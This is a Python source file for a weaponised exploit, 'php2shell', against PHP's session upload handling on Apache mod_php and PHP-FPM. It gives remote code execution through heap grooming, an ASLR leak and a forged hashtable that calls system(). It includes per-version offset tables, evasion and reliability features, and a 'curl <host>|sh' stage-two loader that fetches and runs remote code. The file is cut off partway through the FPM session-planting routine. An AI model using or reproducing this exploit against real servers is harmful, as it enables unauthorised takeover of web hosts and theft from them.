#!/usr/bin/env python3
"""
php2shell.py — self-contained CVE-2026-109618/109619 exploit.

In-band ASLR-bypass RCE for Apache mod_php, with the additions from this research:
keep-alive worker pinning (low-traffic determinism), fully-sprayed leak+fire (busy
multi-worker servers), chunked Transfer-Encoding (stock post_max_size), adaptive OOM
sizing (any memory_limit), version/offset auto-detect, and a `--stage2 <host>` bootstrap
(`curl <host>|sh`) for arbitrary-length payloads past the 14-byte inline cap.

Credit: the core chain and stage grooming constants are from the public research by
@alvarodh5 / @dinosn / @9bie; this file reimplements them standalone (no third-party
import) and adds the reliability/delivery layer.

Lab/authorized use only.
"""
import argparse, os, re, socket, ssl, struct, subprocess, sys, tempfile, threading, time, urllib.parse
from collections import Counter

# --------------------------------------------------------------------- registry
PROFILES = {
    "8.4.26": dict(s3="9bie", htdata=0x690d8, huge=12),
    "8.5.11": dict(s3="nb",   htdata=0x7e0d8, huge=24),
    "8.3.35": dict(s3="9bie", htdata=0x6a0d8, huge=24),   # htdata one page above 8.4.26 (lab-verified)
    "8.2.34": dict(s3="9bie", htdata=None,    huge=24),   # pre-8.3.22 heap + 8.2 session SID validation; needs re-tuned grooming
}
SERIES_DEFAULT = {"8.2": "8.2.34", "8.3": "8.3.35", "8.4": "8.4.26", "8.5": "8.5.11"}
OFFSETS = {
    "x86_64": {
        "8.2.34": (0x39b8a0, 0x487650),
        # 8.3.x Docker official (leak works >= 8.3.22; binary layout shifts per minor)
        "8.3.22": (0x3a2220, 0x491c90), "8.3.23": (0x3a1f40, 0x491690),
        "8.3.24": (0x3ab340, 0x49ccd0), "8.3.25": (0x3ab3c0, 0x49ce10),
        "8.3.26": (0x3ab700, 0x49d290), "8.3.27": (0x3ab680, 0x49d510),
        "8.3.28": (0x3ab8c0, 0x49d790), "8.3.29": (0x3abdc0, 0x49db50),
        "8.3.30": (0x3abc40, 0x49dcd0), "8.3.31": (0x3abe80, 0x49e550),
        "8.3.32": (0x3abe80, 0x49e550), "8.3.33": (0x3abf80, 0x49e650),
        "8.3.35": (0x3ac080, 0x49ec50),
        # 8.4.x Docker official
        "8.4.5":  (0x43b660, 0x62c420), "8.4.10": (0x43b7d0, 0x62cf70),
        "8.4.15": (0x445f70, 0x63d420), "8.4.20": (0x447530, 0x63f9e0),
        "8.4.22": (0x462d30, 0x65b9e0), "8.4.24": (0x464530, 0x65d1e0),
        "8.4.25": (0x464c70, 0x65dc60), "8.4.26": (0x465370, 0x65eb60),
        "8.5.11": (0x5996e0, 0x7b47a0),
        # Sury PPA (apt.sury.org) on Ubuntu/Debian — different binary layout from Docker.
        # Extracted via zend_function_entry scan (zif_system is NOT in Sury's dynsym -
        # Sury's build uses -fvisibility=hidden on user-level functions). See
        # extract_offsets.py for the extraction method; assume 8.3.35 == 8.3.36 Sury
        # (binary layout did not shift across the point-release patches).
        "sury-8.3.36": (0x2394c0, 0x311690), "sury-8.3.35": (0x2394c0, 0x311690),
        "sury-8.4.27": (0x246ee0, 0x428ce0), "sury-8.4.26": (0x246ee0, 0x428ce0),
        # Distro-apt builds measured 2026-10-27. Added for operator calibration
        # even where version is pre-8.3.22-grooming (grooming would need re-tuning).
        "ubuntu-apt-8.3.6": (0x233a10, 0x306380),  # Ubuntu 24.04 noble default apt
        "rocky9-remi-8.3.36": (0x23b650, 0x30b2c0),  # Rocky 9 Remi (patched; useful for --force test)
    },
    "arm64":  {"7.4.33": (0x309640, 0x3f6024), "8.0.30": (0x31ef70, 0x40ddb0),
               "8.1.34": (0x341e08, 0x42e7a0), "8.2.34": (0x36ff48, 0x4606c0),
               "8.3.35": (0x377428, 0x46fcc0), "8.4.26": (0x465370, 0x65eb60),
               "8.5.11": (0x5314f0, 0x761b80)},
}
SID = b"attacksessionid0001"

# --------------------------------------------------------------------- helpers
def multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n" + b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"\r\nContent-Type: application/octet-stream'
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    return bytes(out + b"--" + boundary + b"--\r\n")

def parse_cookie(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1")) if m else b""

def elf_offsets(container):
    LIBS = ["/usr/lib/apache2/modules/libphp.so",
            "/usr/lib/apache2/modules/libphp8.3.so",
            "/usr/lib/apache2/modules/libphp8.4.so",
            "/usr/lib/apache2/modules/libphp8.2.so",
            "/usr/lib/apache2/modules/libphp8.5.so",
            "/usr/local/lib/libphp.so"]
    fd, path = tempfile.mkstemp(suffix=".so"); os.close(fd)
    d = None
    try:
        for lib in LIBS:
            if subprocess.run(["docker", "cp", f"{container}:{lib}", path], capture_output=True).returncode == 0:
                d = open(path, "rb").read(); break
    finally:
        try: os.unlink(path)
        except OSError: pass
    if d is None: return None
    if d[:4] != b"\x7fELF": return None
    e_shoff, = struct.unpack_from("<Q", d, 0x28); e_shentsize, e_shnum = struct.unpack_from("<HH", d, 0x3A)
    secs = []
    for i in range(e_shnum):
        o = e_shoff + i * e_shentsize
        _, typ = struct.unpack_from("<II", d, o); off, size = struct.unpack_from("<QQ", d, o + 24)
        link, = struct.unpack_from("<I", d, o + 40); ent, = struct.unpack_from("<Q", d, o + 56)
        secs.append((typ, off, size, link, ent))
    want = {"zif_system": None, "zval_ptr_dtor": None}
    for typ, off, size, link, ent in secs:
        if typ not in (2, 11): continue
        st = secs[link] if link < len(secs) else None
        if not st: continue
        ent = ent or 24
        for i in range(size // ent):
            o = off + i * ent; nm, = struct.unpack_from("<I", d, o); val, = struct.unpack_from("<Q", d, o + 8)
            if not nm: continue
            s = d.find(b"\x00", st[1] + nm); name = d[st[1] + nm:s].decode("ascii", "replace")
            if name in want and want[name] is None: want[name] = val
    if None in want.values(): return None
    return want["zif_system"], want["zval_ptr_dtor"]

def detect(url, container):
    ver = arch = None
    if container:
        try:
            out = subprocess.run(["docker", "exec", container, "php", "-v"], capture_output=True, text=True, timeout=10).stdout
            m = re.search(r"PHP (\d+\.\d+\.\d+)", out); ver = m.group(1) if m else None
            a = subprocess.run(["docker", "exec", container, "uname", "-m"], capture_output=True, text=True, timeout=10).stdout.strip()
            arch = "arm64" if a in ("aarch64", "arm64") else "x86_64"
        except Exception: pass
    if not ver:
        try:
            import http.client
            u = urllib.parse.urlsplit(url); c = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=8)
            c.request("GET", u.path or "/"); r = c.getresponse(); xp = r.getheader("X-Powered-By") or ""
            m = re.search(r"PHP/(\d+\.\d+\.\d+)", xp); ver = m.group(1) if m else None
        except Exception: pass
    return ver, (arch or ("arm64" if os.uname().machine in ("arm64", "aarch64") else "x86_64"))

# --------------------------------------------------------------------- transport
def _is_ip_literal(host):
    """True iff host is a literal IPv4/IPv6 address (not a hostname that needs SNI)."""
    try:
        import ipaddress
        ipaddress.ip_address(host)
        return True
    except (ValueError, ImportError):
        return False

def _host_header(host, port, tls):
    """Format Host header: bracket IPv6, omit default port."""
    is_v6 = ":" in host and not host.startswith("[")
    h = f"[{host}]" if is_v6 else host
    default_port = 443 if tls else 80
    return h if port == default_port else f"{h}:{port}"

class KA:
    """One persistent keep-alive connection; TLS (SNI for hostnames only, skipped
    for IP literals); IPv6-aware Host header; chunked TE for large bodies
    (bypasses stock post_max_size). post() matches the stage methods' call shape."""
    def __init__(self, url, timeout=20):
        u = urllib.parse.urlsplit(url)
        self.tls = (u.scheme == "https")
        self.host = u.hostname; self.port = u.port or (443 if self.tls else 80)
        self.path = u.path or "/"; self.timeout = timeout; self.s = None
        self.host_header = _host_header(self.host, self.port, self.tls)
        self._sni_name = None if _is_ip_literal(self.host) else self.host
    def _conn(self):
        if self.s is None:
            # create_connection handles IPv4 and IPv6 transparently
            s = socket.create_connection((self.host, self.port), timeout=self.timeout)
            try: s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except OSError: pass
            if self.tls:
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                # Skip SNI for IP targets (some stacks reject invalid SNI; others crash)
                s = ctx.wrap_socket(s, server_hostname=self._sni_name) if self._sni_name else ctx.wrap_socket(s)
            self.s = s
        return self.s
    def reset(self):
        try:
            if self.s: self.s.close()
        except Exception: pass
        self.s = None
    def _read_one(self, s):
        buf = b""
        while b"\r\n\r\n" not in buf:
            c = s.recv(65536)
            if not c: raise ConnectionError("closed")
            buf += c
        head, rest = buf.split(b"\r\n\r\n", 1)
        cl = None; te = b""
        for line in head.split(b"\r\n")[1:]:
            k, _, v = line.partition(b":")
            if k.strip().lower() == b"content-length": cl = int(v.strip())
            elif k.strip().lower() == b"transfer-encoding": te = v.strip().lower()
        body = rest
        if cl is not None:
            while len(body) < cl:
                c = s.recv(65536)
                if not c: break
                body += c
            body = body[:cl]
        elif te == b"chunked":
            while b"0\r\n\r\n" not in body:
                c = s.recv(65536)
                if not c: break
                body += c
        return head + b"\r\n\r\n" + body
    def post(self, body, boundary, read_cap=1 << 20, timeout=None, extra_headers=None):
        thresh = int(os.environ.get("CHUNK_MB", "2")) * (1 << 20)
        extra = "".join(f"{k}: {v}\r\n" for k, v in (extra_headers or {}).items())
        chunked = len(body) > thresh
        framing = "Transfer-Encoding: chunked" if chunked else f"Content-Length: {len(body)}"
        hdr = (f"POST {self.path} HTTP/1.1\r\nHost: {self.host_header}\r\n{extra}"
               f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
               f"{framing}\r\nConnection: keep-alive\r\n\r\n").encode()
        for attempt in (1, 2):
            try:
                s = self._conn(); s.settimeout(timeout or self.timeout)
                s.sendall(hdr); mv = memoryview(body)
                if chunked:
                    for o in range(0, len(body), 65536):
                        p = mv[o:o + 65536]
                        s.sendall(f"{len(p):x}\r\n".encode()); s.sendall(p); s.sendall(b"\r\n")
                    s.sendall(b"0\r\n\r\n")
                else:
                    for o in range(0, len(body), 262144): s.sendall(mv[o:o + 262144])
                return self._read_one(s)
            except (OSError, ConnectionError):
                self.reset()
                if attempt == 2: return b""
        return b""

# --------------------------------------------------------------------- exploit primitives (faithful)
class Exploit:
    def __init__(self, t, cmd, zif, dtor, htdata, huge_mb, arm_mode="bigfield"):
        self.t = t; self.cmd = cmd.encode(); self.zif = zif; self.dtor = dtor
        self.htdata = htdata; self.huge = huge_mb
        # arm_mode: "bigfield" (default) uses 1001 small fields + big field;
        # "nested" uses deep nested array names (MartinPham-style) — try this
        # when bigfield is blocked by post_max_size / proxy 413s.
        self.arm_mode = arm_mode
    def _arm(self, fill=b"x"):
        """Dispatch to arm variant based on self.arm_mode."""
        if self.arm_mode == "nested": return self._oom_nested()
        return self._oom(fill)
    def _big(self):  return {"name": "big", "data": b"B" * (self.huge * 1024 * 1024)}
    def _file(self): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}
    def rotate(self):
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, self._file(), self._big()]
        self.t.post(multipart(parts, b"S" * 17), b"S" * 17, timeout=max(90.0, self.t.timeout)); time.sleep(0.3)
        parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        self.t.post(multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20.0); time.sleep(0.5)
    def _oom(self, fill):
        """Default arm: 1001 small fields (hits max_input_vars → headers_sent)
        + big field (blows memory_limit). ~24MB body shape."""
        parts = [{"name": f"f{i:04d}"[:5], "data": fill} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, self._file(), self._big()]
        self.t.post(multipart(parts, b"S" * 17), b"S" * 17, timeout=max(90.0, self.t.timeout)); time.sleep(0.2)
    def _oom_nested(self, depth=57, count=950, field_count=50, field_value_size=1):
        """Alternative arm (ported from MartinPham/php2shell-poc, MIT): nested
        multipart field names `f[i][x][x]...` × depth. PHP constructs 57-deep
        nested $_POST arrays × 950 iterations, blowing memory_limit via array
        construction (~250KiB wire, ~5MB heap). Different OOM site than
        _oom(); useful when big-field is blocked by post_max_size/413 proxies.
        """
        parts = [{"name": f"p{i:04d}", "data": b"x" * field_value_size} for i in range(field_count)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"ppp"}, self._file()]
        for i in range(count):
            parts.append({"name": f"f[{i}]" + "[x]" * depth, "data": b""})
        self.t.post(multipart(parts, b"S" * 17), b"S" * 17, timeout=max(90.0, self.t.timeout)); time.sleep(0.2)
    def _oom_probe(self, fill):
        """Like _oom but returns the response for diagnostic inspection."""
        parts = [{"name": f"f{i:04d}"[:5], "data": fill} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, self._file(), self._big()]
        r = self.t.post(multipart(parts, b"S" * 17), b"S" * 17, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)
        return r
    def _oom_nested_probe(self, depth=57, count=950):
        """Nested OOM diagnostic variant."""
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(50)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"ppp"}, self._file()]
        for i in range(count):
            parts.append({"name": f"f[{i}]" + "[x]" * depth, "data": b""})
        r = self.t.post(multipart(parts, b"S" * 17), b"S" * 17, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2); return r
    def _stage1_leak(self):
        """Trigger OOM + forge, return (raw_cookie, http_response).
        Caller inspects both to classify failures."""
        self._arm(b"x")
        parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(841): parts.append({"name": str(1000 + i), "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
        forge = bytearray(b"A" * 79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
        resp = self.t.post(multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
        return parse_cookie(resp), resp
    def stage1(self):
        raw, resp = self._stage1_leak()
        self.last_resp = resp; self.last_leak = raw
        if len(raw) < 1000: return 0
        c = Counter()
        for i in range(len(raw) - 8):
            v = int.from_bytes(raw[i:i + 8], "little")
            if 0x100000000000 <= v < 0x800000000000: c[v & ~0x1FFFFF] += 1
        if not c: return 0
        base, n = c.most_common(1)[0]
        if n < 8: return 0
        self.last_chunk = base  # cached for htdata derivation
        return base
    def stage1_diag(self):
        """Return (chunk_base_or_0, failure_reason) for one stage1 attempt.
        Used for operator diagnostics when sprayed stage1 fails."""
        oom_resp = self._oom_probe(b"x")
        oom_fired = b"Allowed memory size" in oom_resp or b"Fatal error" in oom_resp
        # Now the forge request
        parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(841): parts.append({"name": str(1000 + i), "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
        forge = bytearray(b"A" * 79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
        resp = self.t.post(multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
        raw = parse_cookie(resp)
        self.last_resp = resp; self.last_leak = raw
        if not oom_fired and not resp:
            return 0, "no HTTP response from OOM arm (connection failed)"
        if not oom_fired:
            return 0, "OOM did not fire during arm (no Fatal error); try --huge to increase OOM field, or target may be patched (layer-3 post_max_size enforcement)"
        if not resp:
            return 0, "OOM fired but forge request got no response"
        if not raw:
            return 0, "OOM fired but no Set-Cookie returned (session subsystem reset — likely layer-1 php_rinit_session_globals fix)"
        if len(raw) < 100:
            return 0, f"Set-Cookie returned {len(raw)}B (normal session ID); forge did not reclaim PS(id) slot — likely patched or heap-layout mismatch"
        if len(raw) < 1000:
            return 0, f"Set-Cookie returned {len(raw)}B (partial reclaim); grooming unstable"
        c = Counter()
        for i in range(len(raw) - 8):
            v = int.from_bytes(raw[i:i + 8], "little")
            if 0x100000000000 <= v < 0x800000000000: c[v & ~0x1FFFFF] += 1
        if not c:
            return 0, f"leak {len(raw)}B captured but no heap pointers found; forge content wrong"
        base, n = c.most_common(1)[0]
        if n < 8:
            return 0, f"chunk base vote inconclusive ({n} agreeing pointers, need >=8)"
        self.last_chunk = base
        return base, "ok"
    def stage2(self):
        self._arm(b"x" * 39)
        parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(983):
            for j in range(16 if i == 406 else 1): parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 16})
        raw = parse_cookie(self.t.post(multipart(parts, b"B" * 10), b"B" * 10))
        if len(raw) < 16: return 0
        p = int.from_bytes(raw[8:16], "little")
        if not (0x100000000000 <= p < 0x800000000000) or (p & 0xfff) != (self.dtor & 0xfff): return 0
        return p - self.dtor
    def _fake_ht(self, htdata):
        cmd = self.cmd; ht = bytearray(167)
        struct.pack_into("<II", ht, 0, 1, 7)
        struct.pack_into("<II", ht, 8, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0); struct.pack_into("<Q", ht, 0x28, 0)
        struct.pack_into("<Q", ht, 0x30, self.zif)
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x10, self.zif)
        struct.pack_into("<I", ht, E + 0x2C, 1)
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
        struct.pack_into("<I", ht, E + 0x58, 6)
        struct.pack_into("<II", ht, 0x80, 1, 0x106); struct.pack_into("<Q", ht, 0x90, len(cmd))
        ht[0x98:0x98 + len(cmd)] = cmd; ht[0x98 + len(cmd)] = 0
        return bytes(ht)
    def stage3_9bie(self, htdata):
        # pipelined arm+reclaim on one connection (no inter-request gap -> survives load)
        ht = self._fake_ht(htdata)
        carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
        p1 = [{"name": "PHPSESSID", "data": b"a" * 19}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"ppp"}]
        for i in range(6): p1.append({"name": (f"p{i:030d}")[:31], "data": b"V" * 31})
        p1 += [self._file(), self._big()]
        body1 = multipart(p1, b"S" * 17)
        p2 = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(2): p2.append({"name": f"f{i:02d}", "data": b"F" * 15})
        p2.append({"name": "g00", "data": carrier})
        for i in range(15): p2.append({"name": (f"a{i:030d}")[:31], "data": ht})
        body2 = multipart(p2, b"B" * 10)
        t = self.t; t.reset(); s = t._conn(); s.settimeout(t.timeout)
        def mk(b, bn, ex=""):
            return (f"POST {t.path} HTTP/1.1\r\nHost: {t.host_header}\r\n{ex}"
                    f"Content-Type: multipart/form-data; boundary={bn}\r\n"
                    f"Content-Length: {len(b)}\r\nConnection: keep-alive\r\n\r\n").encode()
        try:
            s.sendall(mk(body1, "S" * 17, "Cookie: PHPSESSID=" + "a" * 32 + "\r\n"))
            for o in range(0, len(body1), 262144): s.sendall(body1[o:o + 262144])
            time.sleep(0.3)
            s.sendall(mk(body2, "B" * 10)); s.sendall(body2)
            t._read_one(s); t._read_one(s)
        except Exception:
            t.reset()
    def _live_ref(self, htdata):
        v = bytearray(b"R" * 31); struct.pack_into("<Q", v, 0, (10 << 32) | 1)
        struct.pack_into("<Q", v, 8, htdata); struct.pack_into("<I", v, 0x10, 0x307)
        struct.pack_into("<I", v, 0x14, 0); return bytes(v)
    def _oom_arm_pads(self):
        parts = [{"name": "PHPSESSID", "data": b"a" * 100}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"ppp"}]
        for i in range(107): parts.append({"name": (f"p{i:06d}")[:7], "data": b"V" * 1})
        parts += [self._file(), self._big()]
        self.t.post(multipart(parts, b"S" * 17), b"S" * 17, timeout=max(90.0, self.t.timeout)); time.sleep(0.4)
    def stage3_nb(self, htdata):
        self.rotate(); self._oom_arm_pads()
        ht = self._fake_ht(htdata); live = self._live_ref(htdata)
        parts = [{"name": "PHPSESSID", "data": b"a" * 100}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(8): parts.append({"name": "m%04d" % i, "data": b"M" * 100})
        for i in range(80): parts.append({"name": (f"F{i:030d}")[:31], "data": b"z"})
        for i in range(200): parts.append({"name": "r%04d" % i, "data": live})
        parts.append({"name": (f"a{0:030d}")[:31], "data": ht})
        self.t.post(multipart(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30.0)

# --------------------------------------------------------------------- Chain-E (FPM)
# Ported from dinosn/php-cve-2026-10961x-lab-poc (MIT, 2026-10-26).
# Attack:
#   (1) ARM: multipart POST with PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS + a 65K
#       file field. session_start() runs in request-startup era; the decode
#       OOMs mid-parse. The php-fpm child survives (prefork fork-shared ASLR)
#       with a stale php_unserialize_data struct — the layer-4 primitive via
#       a different trigger.
#   (2) EQUALISE: 2N benign GETs so all pm children's heap history matches
#       the pm=1 geometry the family offsets were measured against.
#   (3) CONSUME: byte-exact multipart POST where field "s" is a value_size-byte
#       zend_string whose tail overlaps the stale struct at chunk+dtor_off+0x18.
#       Fake struct carries used_slots arithmetic that makes var_tmp_var write
#       16-byte zvals at target T = sapi_module + ub_off (plus T+16, T+32 — the
#       serializer does 3 decodes per request). On 8.4.26 T hits ub_write. On
#       8.5.11 first write at +0x20 (activate), second at +0x30 (ub_write).
#       Zval is {IS_LONG, system_addr}. Any output path then calls system(cmd).
# Needs externally provided bases:
#   - php-fpm image base       (parse /proc/<pid>/maps or --fpm-exe)
#   - libc.so.6 base            (same, or --fpm-libc)
#   - Zend MM chunk base        (same, or --fpm-chunk)
# No in-band disclosure on FPM session surface: cookie is emitted by
# php_session_reset_id BEFORE s_read/decode.
# Session content ("a|i:<system_addr>;") must be present. Either:
#   - write session file directly via --fpm-session-dir (local write access), or
#   - grow mode (needs pm>=2 and application accepting attacker-chosen integer
#     in $_SESSION — not supported here; sticks to session-file).

CE_FAMILIES = {
    # 8.3.35 FPM sapi_vma measured 2026-10-27 via extract_offsets.py --php-fpm
    # against php2shell-fpm (image php:8.3.35-fpm). Other grooming parameters
    # (dtor_off, struct_off, value_size) MUST be measured on a dedicated lab -
    # they depend on arena-allocation order which differs per-build; this entry
    # is placeholder-complete for sapi_vma only.
    "8.3.35": dict(struct_off=0x78000, dtor_off=0x6E000, value_size=40960, hdr=0x18,
                   fake_delta=0xE8, entries_delta=0x200, sapi_vma=0x1620760,
                   ub_off=0x30, sys_off=0x53090, status="sapi_vma-only"),
    "8.4.26": dict(struct_off=0x78000, dtor_off=0x6E000, value_size=40960, hdr=0x18,
                   fake_delta=0xE8, entries_delta=0x200, sapi_vma=0x16E1A00,
                   ub_off=0x30, sys_off=0x53090, status="proven"),
    "8.5.11": dict(struct_off=0x8A000, dtor_off=0x7A000, value_size=90112, hdr=0x18,
                   fake_delta=0xE8, entries_delta=0x200, sapi_vma=0x1CE47C0,
                   ub_off=0x20, sys_off=0x53090, status="proven"),
    "8.5.12": dict(struct_off=0x8A000, dtor_off=0x7A000, value_size=90112, hdr=0x18,
                   fake_delta=0xE8, entries_delta=0x200, sapi_vma=0x1CE47A0,
                   ub_off=0x20, sys_off=0x53090, status="patched"),
}

def ce_family(ver):
    """Return family dict for version; branch-transfer to nearest same-minor."""
    if ver in CE_FAMILIES: f = dict(CE_FAMILIES[ver]); f["source"] = "exact"; f["version"] = ver; return f
    if not ver: return None
    br = ".".join(ver.split(".")[:2])
    cands = sorted((v for v in CE_FAMILIES if v.startswith(br + ".")), reverse=True)
    if not cands: return None
    f = dict(CE_FAMILIES[cands[0]]); f["source"] = f"branch-transfer({cands[0]})"
    f["version"] = ver; f["status"] = "experimental"; return f

def ce_parse_maps(text):
    """Parse /proc/<pid>/maps for FPM bases.
      exe   = first php-fpm mapping at file offset 0
      libc  = first libc.so.6 mapping at file offset 0
      chunk = Zend MM 2MB chunk; recognized either as:
                * anon rw-p (no path), 2MB-aligned size, OR
                * named "[anon:zend_alloc]" (newer kernel labelled anon)
              Highest wins — later chunks allocate lower.
    Returns dict; 0 for missing."""
    exe = libc = 0; cands = []
    for line in (text or "").splitlines():
        p = line.split()
        if len(p) < 5 or "-" not in p[0]: continue
        try: s, e = p[0].split("-"); start, end, off = int(s, 16), int(e, 16), int(p[2], 16)
        except ValueError: continue
        path = p[5] if len(p) > 5 else ""; perms = p[1]; size = end - start
        if path.endswith("php-fpm") and off == 0 and not exe: exe = start
        elif path.endswith("libc.so.6") and off == 0 and not libc: libc = start
        else:
            is_anon = (not path) or path == "[anon:zend_alloc]"
            if is_anon and perms == "rw-p" and 0x200000 <= size <= 0x300000:
                # Chunk may have a guard page below the 2MB-aligned base
                chunk = (start + 0x1FFFFF) & ~0x1FFFFF
                if chunk + 0x200000 <= end and chunk - start < 0x100000: cands.append(chunk)
    return {"exe": exe, "libc": libc, "chunk": max(cands) if cands else 0}

def ce_poison_value(fam, chunk, exe, libc):
    """Build the value_size-byte reclaim value. Zend MM allocates it so its
    tail overlaps the stale php_unserialize_data at chunk+dtor_off+0x18.
    Writes used_slots arithmetic so var_tmp_var's write lands at target."""
    val = chunk + fam["dtor_off"] + fam["hdr"]
    target = exe + fam["sapi_vma"] + fam["ub_off"]
    sys_addr = libc + fam["sys_off"]
    fake = val + fam["fake_delta"]
    entries = val + fam["entries_delta"]
    delta = target - fake - 16
    if delta % 16: raise ValueError(f"target {target:#x} not 16-aligned to fake dtor {fake:#x}")
    used = delta // 16
    # Where in the value the stale struct's "last" + "last_dtor" fields land
    struct_rel = fam["struct_off"] - fam["dtor_off"] - fam["hdr"]
    if struct_rel < 0 or struct_rel + 0x18 > fam["value_size"]:
        raise ValueError(f"struct_rel {struct_rel:#x} outside {fam['value_size']}-byte value")
    v = bytearray(b"V" * fam["value_size"])
    struct.pack_into("<Q", v, struct_rel, entries)         # ->last
    struct.pack_into("<Q", v, struct_rel + 0x10, fake)      # ->last_dtor
    struct.pack_into("<q", v, fam["fake_delta"], used)      # fake dtor->used_slots
    v[fam["entries_delta"]:fam["entries_delta"] + 0x40] = b"\x00" * 0x40
    return bytes(v), {"val": val, "target": hex(target), "system": hex(sys_addr),
                      "used_slots": used, "struct_rel": hex(struct_rel)}

def ce_session_blob(sys_addr):
    """Session content: $_SESSION["a"] = <system_addr>. Decoded by session.decode,
    the integer value sits in a zval that the stale struct's write-what-where
    uses as the IS_LONG value written at ub_write."""
    return b"a|i:%d;" % int(sys_addr)

def ce_sid():
    """26-char SID: matters because the parser's $_SERVER build is header- and
    shape-sensitive; shorter/longer SIDs move reclaim placement."""
    import secrets, string
    return "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(26))

class ExploitFPM:
    """Chain-E FPM exploitation. Externally-provided bases required."""
    def __init__(self, t, cmd, fam, chunk, exe, libc, session_dir=None, memory_limit_mib=64, docker_container=None):
        self.t = t; self.cmd = cmd.encode() if isinstance(cmd, str) else cmd
        self.fam = fam; self.chunk = chunk; self.exe = exe; self.libc = libc
        self.session_dir = session_dir
        # arm_bytes sizes the pre-planted session file. session_start reads the
        # whole file into memory AND allocates another same-size string for the
        # unserialize result -> 2x the file size against the memory_limit. Pick
        # ml/2 + 4 MB margin so one allocation fits but the second OOMs.
        self.arm_bytes = max(64, memory_limit_mib // 2 + 4) * 1024 * 1024
        # Lab mode: when a container is set, chown planted files to www-data via
        # `docker exec` after writing. Required when the Python process cannot
        # write files PHP's session handler can later open with O_RDWR (file
        # perms crossing UIDs via a bind-mounted volume don't always honour
        # 0o666 inside the container, so group-match alone can still EACCES).
        self.docker_container = docker_container
    def _fixup_perms(self, path):
        """Lab helper: when running against a docker FPM, chown the planted
        session file to www-data inside the container so PHP's session handler
        can open it with O_RDWR."""
        if not self.docker_container: return
        import subprocess
        try:
            subprocess.run(
                ["docker", "exec", self.docker_container, "chown", "www-data:www-data",
                 f"/var/lib/php/sessions/{os.path.basename(path)}"],
                check=False, capture_output=True, timeout=5)
        except Exception: pass
    def _arm_payload(self):
        """``a|s:<N>:"AAA...";``: one declared-length string. Reading the file
        allocates N bytes; unserialize's string parse allocates another N -> OOM."""
        n = self.arm_bytes
        return b'a|s:%d:"' % n + b"A" * n + b'";'
    def _write_arm_session(self, sid):
        """Pre-plant huge session file at arm_sid. Content is one declared-length
        string whose decode doubles the footprint. The arm request's session_start
        then OOMs mid-decode, leaving BG(unserialize).data dangling.

        chmod 0666 because PHP's session files handler opens O_RDWR; a 0644
        file owned by someone other than the PHP user triggers EACCES and the
        session fails to read (so no OOM, so no arm)."""
        if not self.session_dir: raise RuntimeError("no --fpm-session-dir; cannot plant arm blob")
        p = os.path.join(self.session_dir, f"sess_{sid}")
        with open(p, "wb") as f:
            n = self.arm_bytes
            f.write(b'a|s:%d:"' % n)
            # Stream the 'A' body in 1 MB blocks to keep memory usage bounded here
            block = b"A" * (1024 * 1024)
            remaining = n
            while remaining > 0:
                take = min(len(block), remaining)
